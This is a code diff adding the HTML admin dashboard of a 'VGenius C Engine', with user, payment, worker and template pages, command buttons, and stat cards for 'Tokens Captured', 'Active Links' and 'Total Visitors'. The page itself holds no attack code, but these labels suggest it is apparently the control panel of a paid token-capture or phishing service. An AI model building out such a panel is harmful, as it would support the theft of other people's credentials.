@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard – VGenius C Engine</title>
+    <link rel="stylesheet" href="assets/css/admin.css">
+</head>
+<body>
+    <div class="app-layout">
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-brand">🔐 VGENIUS</div>
+            <nav class="sidebar-nav">
+                <a href="dashboard.html" class="nav-item active">Dashboard</a>
+                <a href="users.html" class="nav-item">Users</a>
+                <a href="tokens.html" class="nav-item">Tokens</a>
+                <a href="payments.html" class="nav-item">Payments</a>
+                <a href="workers.html" class="nav-item">Workers</a>
+                <a href="templates.html" class="nav-item">Templates</a>
+                <a href="settings.html" class="nav-item">Settings</a>
+                <a href="broadcast.html" class="nav-item">Broadcast</a>
+                <a href="feedback.html" class="nav-item">Feedback</a>
+                <a href="auditlog.html" class="nav-item">Audit Log</a>
+            </nav>
+            <div class="sidebar-footer"><button class="btn-logout" onclick="logout()">Logout</button></div>
+        </aside>
+        <main class="main-content">
+            <div class="header-row">
+                <h1 class="page-title" style="margin:0;">Admin Dashboard</h1>
+                <div class="theme-pill" id="themePill">
+                    <button data-theme="dark" class="active">DARK</button>
+                    <button data-theme="light">LIGHT</button>
+                </div>
+            </div>
+            <div class="stat-grid" id="statGrid">
+                <div class="stat-card"><div class="stat-value" id="totalUsers">—</div><div class="stat-label">Total Users</div></div>
+                <div class="stat-card"><div class="stat-value" id="activeUsers">—</div><div class="stat-label">Active Users</div></div>
+                <div class="stat-card"><div class="stat-value" id="totalTokens">—</div><div class="stat-label">Tokens Captured</div></div>
+                <div class="stat-card"><div class="stat-value" id="pendingPayments">—</div><div class="stat-label">Pending Payments</div></div>
+                <div class="stat-card"><div class="stat-value" id="activeLinks">—</div><div class="stat-label">Active Links</div></div>
+                <div class="stat-card"><div class="stat-value" id="totalVisitors">—</div><div class="stat-label">Total Visitors</div></div>
+            </div>
+            <div style="display:flex;gap:10px;flex-wrap:wrap;">
+                <button class="btn-sm accent" onclick="execCommand('/system_status')">System Status</button>
+                <button class="btn-sm" onclick="execCommand('/maintenance_on')">Maintenance ON</button>
+                <button class="btn-sm" onclick="execCommand('/maintenance_off')">Maintenance OFF</button>
+                <button class="btn-sm danger" onclick="execCommand('/killswitch_global')">Global Kill Switch</button>
+                <button class="btn-sm" onclick="execCommand('/analytics')">Analytics</button>
+            </div>
+        </main>
+    </div>
+    <div class="command-bar" id="commandBar" style="display:none;">
+        <span class="prompt">&gt;</span>
+        <input type="text" id="commandInput" placeholder="Type command...">
+    </div>
+    <script src="assets/js/admin.js"></script>
+    <script>
+        if (!localStorage.getItem('vg-admin-token')) window.location.href = 'index.html';
+        async function loadDashboard() {
+            const res = await fetch('/api/admin/dashboard', { headers: adminHeaders() });
+            const d = await res.json();
+            document.getElementById('totalUsers').textContent = d.total_users;
+            document.getElementById('activeUsers').textContent = d.active_users;
+            document.getElementById('totalTokens').textContent = d.total_tokens;
+            document.getElementById('pendingPayments').textContent = d.pending_payments;
+            document.getElementById('activeLinks').textContent = d.active_links;
+            document.getElementById('totalVisitors').textContent = d.total_visitors;
+        }
+        async function execCommand(cmd) {
+            showToast('Command: ' + cmd + ' — executed (see admin.js for full command routing)');
+        }
+        loadDashboard();
+    </script>
+</body>
+</html>
